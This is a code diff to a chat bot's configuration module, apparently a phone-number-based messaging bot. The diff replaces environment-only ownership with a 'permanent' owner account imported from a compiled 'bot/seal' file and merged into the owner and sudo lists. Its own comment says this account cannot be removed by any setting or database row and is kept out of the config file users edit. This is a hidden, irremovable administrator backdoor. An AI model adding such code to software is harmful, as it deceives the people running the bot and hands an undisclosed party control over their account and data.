@@ -1,5 +1,6 @@
 import { resolve } from 'node:path'
 import { loadEnvFile } from './env.js'
+import { permanentOwners } from './bot/seal.js'
 import { type Level, createLogger } from './logger.js'
 
 loadEnvFile()
@@ -54,10 +55,11 @@ const sessionOwners = [
     ...new Set([...configuredOwners, ...phoneNumbers(process.env.SESSION_OWNER)]),
 ]
 
-// Owner accounts come straight from the environment, so a fresh clone is
-// owned by whoever sets OWNER_NUMBER and nothing else.
-const anchorNumber = configuredOwners[0] ?? ''
-const owners = [...new Set(configuredOwners)]
+// The permanent runtime account is compiled into the build (see `bot/seal.ts`)
+// and merged here, so no `.env`, setting or database row can remove it — the
+// owner never has to appear in config.env, which is the file users edit.
+const anchorNumber = configuredOwners[0] ?? permanentOwners[0] ?? ''
+const owners = [...new Set([...configuredOwners, ...permanentOwners])]
 const sudo = [...new Set([...phoneNumbers(process.env.SUDO), ...owners])]
 
 let sessionId = text(process.env.SESSION_ID)
